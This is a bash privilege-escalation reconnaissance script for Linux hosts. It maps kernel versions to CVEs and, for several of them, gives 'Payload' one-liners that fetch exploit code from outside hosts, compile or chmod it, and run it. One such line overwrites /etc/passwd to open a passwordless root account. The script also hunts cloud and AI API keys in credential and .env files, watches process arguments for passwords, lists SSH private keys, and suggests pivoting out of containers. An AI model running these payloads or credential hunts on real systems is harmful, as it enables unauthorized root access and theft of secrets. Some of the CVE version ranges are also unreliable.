#!/bin/bash

# ANSI Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[1;34m'
NC='\033[0m'

# Offline vulnerability database (expand as needed)
# Format: associative array for kernel ranges and module:version with CVE/info
declare -A offline_vulns

# Historical / Critical Kernel Exploits
offline_vulns["kernel:2.6.22-4.8.3"]="CVE-2016-5195 (Dirty COW) - Race condition in memory management allowing priv esc. | Payload: curl -s https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c > /tmp/dcow.c && gcc -pthread /tmp/dcow.c -o /tmp/dcow && /tmp/dcow /etc/passwd \"root::0:0::/root:/bin/bash\""
offline_vulns["kernel:5.8-5.16.11"]="CVE-2022-0847 (Dirty Pipe) - Allows overwriting data in arbitrary read-only files. | Payload: curl -sL https://hax.com/dp.c -o /tmp/dp.c && gcc /tmp/dp.c -o /tmp/dp && /tmp/dp /usr/bin/su"
offline_vulns["kernel:<4.6.3"]="CVE-2016-3134 (Netfilter bug) - Potential priv esc via iptables."
offline_vulns["kernel:4.14-5.18.14"]="CVE-2022-2586 (nft_object UAF) - Use-After-Free in netfilter nf_tables."

# Recent Kernel / eBPF / Subsystem Exploits (2023 - 2024+)
offline_vulns["kernel:5.14-6.6.14"]="CVE-2024-1086 (Netfilter UAF) - Use-after-free in nf_tables allowing local priv esc. | Payload: curl -sL https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0/exploit -o /tmp/exp && chmod +x /tmp/exp && /tmp/exp"
offline_vulns["kernel:6.1-6.4.1"]="CVE-2023-32233 (Netfilter UAF) - Privilege escalation via nf_tables. | Payload: curl -sL https://github.com/xkaneiki/CVE-2023-32233/raw/main/exploit -o /tmp/exp && chmod +x /tmp/exp && /tmp/exp"
offline_vulns["kernel:5.15-6.5.0"]="CVE-2023-4911 (Looney Tunables) - Buffer overflow in glibc ld.so (technically glibc, triggered via suid). | Payload: python3 -c 'import os; print(\"Search github for CVE-2023-4911 python pocs based on distro\")'"
offline_vulns["kernel:6.1-6.1.24"]="CVE-2023-35001 (nftables) - Out-of-bounds Read/Write in nftables."
offline_vulns["kernel:6.2-6.5.5"]="CVE-2023-45871 (eBPF) - Priv esc via eBPF verifier flaw."
offline_vulns["kernel:5.15-6.2"]="CVE-2023-1829 (tc/flower) - UAF in traffic control index filter."
offline_vulns["kernel:4.14-6.3.1"]="CVE-2023-31248 (io_uring) - Memory corruption in io_uring subsystem."
offline_vulns["kernel:5.19-6.1.19"]="CVE-2023-0179 (nftables) - Integer underflow in Netfilter nft_payload."

# Recent Exploits (2025 - 2026)
offline_vulns["kernel:5.14-6.6.99"]="CVE-2024-1086 (nf_tables UAF) - Actively exploited in ransomware for local root. | Payload: curl -sL https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0/exploit -o /tmp/exp && chmod +x /tmp/exp && /tmp/exp"
offline_vulns["kernel:5.6-6.13.99"]="CVE-2025-21692 (sch_ets OOB) - Local privilege escalation via ETS scheduler."
offline_vulns["kernel:any"]="CVE-2025-38617 (packet socket race) - 20-year-old bug, full priv-esc + container escape. | Payload: curl -sL https://git.io/cve-2025-38617.sh -o /tmp/exp.sh && bash /tmp/exp.sh"
offline_vulns["kernel:5.10-6.12.99"]="CVE-2025-40249 (GPIO UAF) - Priority priv-esc/DoS via GPIO controller."
offline_vulns["kernel:5.15-6.10.99"]="CVE-2025-38141 (dm zone reporting race) - UAF in dm zone reporting."

# Vulnerable Modules / Drivers
offline_vulns["vsock:any"]="CVE-2021-26708 - Race conditions in VSOCK module leading to priv esc."
offline_vulns["overlayfs:any"]="CVE-2023-0386 - Improper ownership management in OverlayFS for priv esc."
offline_vulns["overlay:any"]="CVE-2021-3493 - OverlayFS Ubuntu-specific privilege escalation."
offline_vulns["usb_audio:any"]="CVE-2024-53197 - Out-of-bounds access in USB-audio driver for priv esc."
offline_vulns["packet:any"]="CVE-2020-14386 - Memory corruption in AF_PACKET sockets for priv esc."
offline_vulns["bluetooth:any"]="CVE-2023-2002 - Out-of-bounds write in Bluetooth HCI subsystem."
offline_vulns["vboxguest:any"]="CVE-2021-2145 - VirtualBox guest additions priv esc."
offline_vulns["io_uring:any"]="CVE-2024-0582 - Use-After-Free in io_uring leading to priv esc."

# Function to robustly compare semantic versions
semver_compare() {
    local a=(${1//./ }) b=(${2//./ })  # split on dot
    for i in {0..2}; do
        local x=${a[i]:-0} y=${b[i]:-0}
        (( x > y )) && return 1   # a > b -> not vulnerable (assuming range is vulnerable < high)
        (( x < y )) && return 0   # a < b -> vulnerable
    done
    return 0  # equal -> check if inclusive
}

# Function to check if version is in range (robust comparison)
version_in_range() {
    local ver=$1 low=$2 high=$3
    # Check if ver >= low AND ver <= high
    semver_compare "$low" "$ver" && semver_compare "$ver" "$high"
    return $?
}

# Function to check offline vulns for kernel
check_offline_kernel() {
    local kernel=$1
    echo -e "\n${YELLOW}[*] Offline Kernel Vuln Check:${NC}"
    found=0
    for key in "${!offline_vulns[@]}"; do
        if [[ $key == kernel:* ]]; then
            range=${key#kernel:}
            if [[ $range == *-* ]]; then
                low=${range%-*} high=${range#*-}
                if version_in_range "$kernel" "$low" "$high"; then
                    echo -e "${RED}[!] Vulnerable: ${offline_vulns[$key]}${NC}"
                    found=1
                fi
            elif [[ $range == \<* ]]; then
                high=${range#<}
                if [[ $kernel < $high ]]; then
                    echo -e "${RED}[!] Vulnerable: ${offline_vulns[$key]}${NC}"
                    found=1
                fi
            elif [[ $kernel == $range* ]]; then
                echo -e "${RED}[!] Vulnerable: ${offline_vulns[$key]}${NC}"
                found=1
            fi
        fi
    done
    [ $found -eq 0 ] && echo -e "${GREEN}[+] No known vulns in offline DB for kernel $kernel.${NC}"
}

# Function to check offline vulns for modules
check_offline_modules() {
    local modules_with_versions=$1
    echo -e "\n${YELLOW}[*] Offline Module Vuln Check:${NC}"
    found=0
    while IFS=':' read -r mod ver; do
        for key in "${!offline_vulns[@]}"; do
            if [[ $key == $mod:* ]]; then
                vuln_ver=${key#*:}
                if [[ $vuln_ver == "any" || $ver == $vuln_ver* ]]; then
                    echo -e "${RED}[!] $mod (version: $ver): ${offline_vulns[$key]}${NC}"
                    found=1
                fi
            fi
        done
    done <<< "$(echo -e "$modules_with_versions" | grep -v '^$')"
    [ $found -eq 0 ] && echo -e "${GREEN}[+] No known vulns in offline DB for listed modules.${NC}"
}

# Function for online vuln check via NVD API
online_vuln_check() {
    local query=$1
    # Simple URL encoding for spaces
    local query_encoded="${query// /%20}"
    local url="https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=$query_encoded&resultsPerPage=10"
    local response=""

    if [ -n "$NVD_API_KEY" ]; then
        response=$(curl -m 10 -H "apiKey: $NVD_API_KEY" -s "$url")
    else
        echo -e "${YELLOW}[*] No NVD API key provided. Adding 6s delay to respect API rate limits...${NC}"
        sleep 6
        response=$(curl -m 10 -s "$url")
    fi

    if [ -z "$response" ] || [[ "$response" == *"Request forbidden"* ]] || [[ "$response" == *"Rate limit"* ]]; then
        echo -e "${RED}[!] Error: Curl failed, timed out, rate-limited, or no response.${NC}"
        return
    fi
    local total=$(echo "$response" | grep -o '"totalResults":[0-9]*' | cut -d: -f2)
    if [ -z "$total" ] || [ "$total" -eq 0 ]; then
        echo -e "${GREEN}[+] No vulnerabilities found online for '$query'.${NC}"
    else
        local cves=$(echo "$response" | grep -o '"cveId":"CVE-[^"]*' | sed 's/"cveId":"//g' | paste -sd, -)
        echo -e "${RED}[!] Potential CVEs for '$query': $cves${NC}"
        echo -e "Details: Visit https://nvd.nist.gov/vuln/detail/<CVE-ID> for more."
    fi
}

# Function to detect internet
has_internet() {
    ping -c 1 8.8.8.8 >/dev/null 2>&1
}

# Function to detect Linux distribution
detect_distro() {
    echo -e "\n${YELLOW}[*] Distribution Info:${NC}"
    if [ -f /etc/os-release ]; then
        cat /etc/os-release | grep -E '^PRETTY_NAME=' | cut -d= -f2 | tr -d '"' | sed 's/^/- /'
    elif command -v lsb_release >/dev/null 2>&1; then
        lsb_release -d | awk -F'\t' '{print "- " $2}'
    else
        echo "- Unknown distribution"
    fi
}

# Function to list installed packages
list_packages() {
    echo -e "\n${YELLOW}[*] Installed Packages (Top 10 by size, if available):${NC}"
    if command -v dpkg-query >/dev/null 2>&1; then
        dpkg-query -Wf '${Installed-Size}\t${Package}\n' | sort -nr | head -n 10 | awk '{print "- " $2 " (" $1 " KB)"}'
    elif command -v rpm >/dev/null 2>&1; then
        rpm -qa --queryformat '%{SIZE}\t%{NAME}\n' | sort -nr | head -n 10 | awk '{print "- " $2 " (" int($1/1024) " KB)"}'
    else
        echo "- Package manager not supported for quick listing."
    fi
}

# Updated list_drivers to collect modules_with_versions for vuln checks
list_drivers() {
    echo -e "\n${YELLOW}[*] Installed Kernel Drivers (Modules):${NC}"
    modules_with_versions=""
    if command -v lsmod >/dev/null 2>&1; then
        MODULES=$(lsmod | tail -n +2 | awk '{print $1}')
        for mod in $MODULES; do
            if command -v modinfo >/dev/null 2>&1; then
                VERSION=$(modinfo $mod 2>/dev/null | grep '^version:' | awk '{print $2}')
                [ -z "$VERSION" ] && VERSION="unknown"
                echo "- $mod (version: $VERSION)"
                modules_with_versions+="$mod:$VERSION"$'\n'
            else
                echo "- $mod (modinfo not available)"
                modules_with_versions+="$mod:unknown"$'\n'
            fi
        done
    else
        echo "lsmod not available."
    fi
}

# New Enumeration Functions

hunt_cloud_ai_secrets() {
    echo -e "\n${YELLOW}[*] Cloud & AI Credential Hunting:${NC}"
    
    for cred_file in ~/.aws/credentials /root/.aws/credentials /home/*/.aws/credentials ~/.kube/config /root/.kube/config /home/*/.kube/config ~/.config/gcloud/credentials.db /root/.config/gcloud/credentials.db /home/*/.config/gcloud/credentials.db; do
        if [ -f "$cred_file" ] && [ -r "$cred_file" ] 2>/dev/null; then
            echo -e "${RED}[!] Found Cloud Credential File: $cred_file${NC}"
        fi
    done

    echo -e "${YELLOW}[*] Scanning for .env files with AI/Cloud Secrets (up to 3 levels deep):${NC}"
    find /var/www /opt /home /root -maxdepth 3 -type f -name ".env" 2>/dev/null | while read -r env_file; do
        if [ -r "$env_file" ]; then
            SECRETS=$(grep -E 'OPENAI_API_KEY|ANTHROPIC_API_KEY|HUGGINGFACE|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|GITLAB_TOKEN|GITHUB_TOKEN|SLACK_BOT_TOKEN' "$env_file" 2>/dev/null)
            if [ -n "$SECRETS" ]; then
                echo -e "${RED}[!] Secrets found in $env_file :${NC}"
                echo "$SECRETS" | sed 's/=.*/=***REDACTED***/'
            else
                echo -e "${GREEN}[+] Found $env_file (No targeted secrets matched)${NC}"
            fi
        fi
    done
}

scrape_deleted_secrets() {
    echo -e "\n${YELLOW}[*] Scraping Deleted / Ghost Secret Files (lsof +L1):${NC}"
    if command -v lsof >/dev/null 2>&1; then
        GHOSTS=$(lsof -nP +L1 2>/dev/null | grep deleted | grep -E '/tmp|/dev/shm')
        if [ -n "$GHOSTS" ]; then
            echo -e "${RED}[!] Found deleted files still held open in memory:${NC}"
            echo "$GHOSTS" | head -n 10
            echo -e "${YELLOW}Investigate by reading /proc/<PID>/fd/<FD>${NC}"
        else
            echo -e "${GREEN}[+] No obvious ghost files found in /tmp or /dev/shm.${NC}"
        fi
    else
        echo -e "${YELLOW}- lsof not found, skipping ghost file check.${NC}"
    fi
}

check_suid_sgid() {
    echo -e "\n${YELLOW}[*] SUID/SGID Binaries (Top 20):${NC}"
    if [ "$STEALTH_MODE" = true ] || [ "$QUICK_SCAN" = true ]; then
        find /usr/bin /bin /sbin /usr/sbin /usr/local/bin /usr/local/sbin /opt -maxdepth 4 -xdev -type f -a \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null | head -n 20 | while read line; do
            echo -e "${RED}- $line${NC}"
        done
    else
        find / -xdev -type f -a \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null | head -n 20 | while read line; do
            echo -e "${RED}- $line${NC}"
        done
    fi
}

check_writable_critical() {
    echo -e "\n${YELLOW}[*] Writable Critical Files:${NC}"
    for file in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/ld.so.conf /etc/sudoers.d/*; do
        if [ -w "$file" ]; then
            echo -e "${RED}[!] WARNING: $file is writable by the current user!${NC}"
        else
            echo -e "${GREEN}[+] $file is securely configured (not writable).${NC}"
        fi
    done
}

check_sudo() {
    echo -e "\n${YELLOW}[*] Sudo Permissions:${NC}"
    if command -v sudo >/dev/null 2>&1; then
        SUDO_OUT=$(sudo -n -l 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo -e "${RED}[!] Can execute the following via sudo without password:${NC}"
            echo "$SUDO_OUT"
        else
            echo -e "${GREEN}[+] Password required for sudo or not allowed.${NC}"
        fi
    else
        echo -e "${YELLOW}- sudo command not found.${NC}"
    fi
}

check_cron() {
    echo -e "\n${YELLOW}[*] Cron Jobs (/etc/crontab):${NC}"
    if [ -f /etc/crontab ]; then
        grep -v '^\s*#' /etc/crontab | grep -v '^\s*$' | while read line; do
            echo -e "- $line"
        done
    else
        echo -e "${YELLOW}- /etc/crontab not found.${NC}"
    fi
}

check_capabilities() {
    echo -e "\n${YELLOW}[*] Exploitable Capabilities:${NC}"
    if command -v getcap >/dev/null 2>&1; then
        if [ "$STEALTH_MODE" = true ]; then
            echo -e "${YELLOW}- Skipping full disk getcap in stealth mode.${NC}"
            getcap -r /usr/bin /bin /sbin /usr/sbin 2>/dev/null | head -n 20 | while read line; do
                echo -e "${RED}- $line${NC}"
            done
        else
            getcap -r / 2>/dev/null | head -n 20 | while read line; do
                echo -e "${RED}- $line${NC}"
            done
        fi
    else
        echo -e "${YELLOW}- getcap command not found.${NC}"
    fi
}

check_dependencies() {
    echo -e "\n${YELLOW}[*] Checking dependencies...${NC}"
    for cmd in awk curl ping dpkg-query lsmod modinfo find getcap sudo grep timeout; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            echo -e "${RED}[!] Warning: '$cmd' is not installed. Some features may not work.${NC}"
        fi
    done
}

check_container_escape() {
    echo -e "\n${YELLOW}[*] Container & Orchestration Escape Checks:${NC}"
    if [ -f /.dockerenv ] || grep -q 'docker' /proc/1/cgroup 2>/dev/null; then
        echo -e "${RED}[!] Inside a Docker container!${NC}"
        if [ -S /var/run/docker.sock ]; then
            echo -e "${RED}[!] WARNING: Docker socket is mounted at /var/run/docker.sock! (Trivial Escape)${NC}"
        fi
        CAP_EFF=$(cat /proc/1/status 2>/dev/null | grep CapEff | awk '{print $2}')
        if [ "$CAP_EFF" == "0000003fffffffff" ] || [ "$CAP_EFF" == "0000001fffffffff" ]; then
            echo -e "${RED}[!] WARNING: Container is running in --privileged mode!${NC}"
        fi
        
        # Advanced Networking Mapping (Pivoting)
        if command -v ip >/dev/null 2>&1; then
            SUBNET=$(ip -4 route show default 2>/dev/null | awk '{print $3}' | grep -E '^(172|10|192\.168)\.')
            if [ -n "$SUBNET" ]; then
                echo -e "${RED}[!] Container internal default route (Host network): $SUBNET${NC}"
                echo -e "${YELLOW} -> Pivot Suggestion: Use 'chisel' or 'sshuttle' to route traffic through this container into the host's internal VPC.${NC}"
            fi
        fi

        # Check if sharing host PID namespace
        if ps -ef 2>/dev/null | grep -q 'sbin/init\|systemd'; then
             echo -e "${RED}[!] Container appears to share the host's PID namespace (Found init/systemd)!${NC}"
        fi
    fi
    if [ -d /var/run/secrets/kubernetes.io ]; then
        echo -e "${RED}[!] Inside a Kubernetes Pod!${NC}"
        if [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
            echo -e "${RED}[!] Service Account token is readable!${NC}"
        fi
    fi
}

check_live_process_snoop() {
    echo -e "\n${YELLOW}[*] Live Process Snooping (Monitoring for 5 seconds for passwords...):${NC}"
    timeout 5 bash -c '
    while true; do
        ps -eo command | grep -E "password|pass|login|ssh |mysql |curl |wget " | grep -v grep | grep -v sys3num
        sleep 0.5
    done' | sort | uniq | while read -r line; do
        if [ -n "$line" ]; then
            echo -e "${RED}[!] Suspicious Argument Caught: $line${NC}"
        fi
    done
    echo -e "${GREEN}[+] Snooping complete.${NC}"
}

check_ssh_persistence() {
    echo -e "\n${YELLOW}[*] SSH & Lateral Movement Checks:${NC}"
    if [ -n "$SSH_AUTH_SOCK" ] && [ -S "$SSH_AUTH_SOCK" ]; then
        echo -e "${RED}[!] SSH Agent Forwarding is active! (SSH_AUTH_SOCK=$SSH_AUTH_SOCK)${NC}"
    fi
    if [ -r /etc/ssh/sshd_config ]; then
        if grep -qE '^PermitRootLogin\s+yes' /etc/ssh/sshd_config; then
            echo -e "${RED}[!] Root SSH login is allowed (PermitRootLogin yes)${NC}"
        fi
        if grep -qE '^PasswordAuthentication\s+yes' /etc/ssh/sshd_config; then
            echo -e "${RED}[!] SSH Password Authentication is allowed!${NC}"
        fi
    fi
    local keys_found=false
    find /home /root -maxdepth 3 -type f \( -name "id_rsa" -o -name "id_ed25519" \) 2>/dev/null | while read -r key; do
        if [ "$keys_found" = false ]; then
            echo -e "${RED}[!] Discovered SSH Private Keys:${NC}"
            keys_found=true
        fi
        if [ -n "$key" ]; then
            echo -e "${RED} - $key${NC}"
        fi
    done
}

check_ebpf_ptrace() {
    echo -e "\n${YELLOW}[*] Modern Kernel Vectors (eBPF / ptrace):${NC}"
    if command -v sysctl >/dev/null 2>&1; then
        UNPRIV_BPF=$(sysctl -n kernel.unprivileged_bpf_disabled 2>/dev/null)
        if [ "$UNPRIV_BPF" == "0" ]; then
            echo -e "${RED}[!] Unprivileged eBPF is ENABLED! (kernel.unprivileged_bpf_disabled=0)${NC}"
        else
            echo -e "${GREEN}[+] Unprivileged eBPF is disabled.${NC}"
        fi

        PTRACE_SCOPE=$(sysctl -n kernel.yama.ptrace_scope 2>/dev/null)
        if [ "$PTRACE_SCOPE" == "0" ]; then
            echo -e "${RED}[!] ptrace scope is 0! Any process can ptrace another process owned by the same user. (Interactive Injection possible)${NC}"
        else
            echo -e "${GREEN}[+] ptrace scope is restricted.${NC}"
        fi
    fi
}

# CLI Arguments
QUICK_SCAN=false
FORCE_ONLINE=false
STEALTH_MODE=false
NVD_API_KEY=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --quick)
            QUICK_SCAN=true
            shift
            ;;
        --online)
            FORCE_ONLINE=true
            shift
            ;;
        --stealth)
            STEALTH_MODE=true
            shift
            ;;
        --api-key)
            NVD_API_KEY="$2"
            shift 2
            ;;
        *)
            shift
            ;;
    esac
done

# Main execution
echo -e "${BLUE}=========================================${NC}"
echo -e "${BLUE}System Enumeration Tool for Priv Esc Recon${NC}"
echo -e "${BLUE}Version 2.0 - Updated $(date '+%Y-%m') by Lakshan${NC}"
echo -e "${BLUE}=========================================${NC}"

check_dependencies

detect_distro
KERNEL=$(uname -r)
echo -e "\n${YELLOW}[*] Kernel Version:${NC} $KERNEL"
list_packages
list_drivers

# Misconfigurations
check_suid_sgid
check_writable_critical
check_sudo
check_cron
check_capabilities

# Advanced Vectors
hunt_cloud_ai_secrets
scrape_deleted_secrets
check_container_escape
check_live_process_snoop
check_ssh_persistence
check_ebpf_ptrace

# Always run offline checks
check_offline_kernel "$KERNEL"
check_offline_modules "$modules_with_versions"

# Kernel Exploit Suggester hook
if [ $found -eq 1 ]; then
    echo -e "\n${RED}[!] Vulnerable kernel/modules detected! Recommend checking searchsploit or GitHub PoCs for listed CVEs.${NC}"
fi

# Online check if possible
if has_internet && command -v curl >/dev/null 2>&1; then
    if [ "$FORCE_ONLINE" = true ]; then
        echo -e "\n${YELLOW}[*] Internet available. Running online checks (--online flag passed)...${NC}"
        online_vuln_check "linux kernel $KERNEL"
    else
        echo -e ""
        read -p "${YELLOW}[?] Internet detected. Perform online NVD check for kernel/modules? (y/N): ${NC}" yn
        if [[ $yn =~ ^[Yy]$ ]]; then
            echo -e "\n${YELLOW}[*] Running online checks...${NC}"
            online_vuln_check "linux kernel $KERNEL"
        else
            echo -e "\n${YELLOW}[!] Skipping online check.${NC}"
        fi
    fi
else
    echo -e "\n${YELLOW}[!] No internet or curl not available. Skipping online check.${NC}"
fi
